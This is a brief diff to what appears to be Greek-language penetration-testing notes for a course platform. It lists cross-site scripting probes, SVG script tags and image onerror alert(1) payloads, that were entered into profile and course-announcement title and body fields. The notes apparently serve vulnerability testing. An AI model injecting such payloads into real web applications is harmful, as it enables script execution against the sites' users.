@@ -76,6 +76,13 @@ TzeniPantazi<svg xmlns="#"><script>alert(1)</script></svg>
 ---> Συμπληρωματικά Στοιχεία
 	<svg xmlns="#"><script>alert(1)</script></svg>
 
+Προσθήκη ανακοίνωσης σε μάθημα
+--->Τίτλος ανακοίνωσης
+	<image src=1 href=1 onerror="javascript:alert(1)"></image>
+--->Σώμα ανακοίνωσης
+	<image src=1 href=1 onerror="javascript:alert(1)"></image>
+
+
 --------------------------------------------------------------------------------------------------------
 
 THANOS:
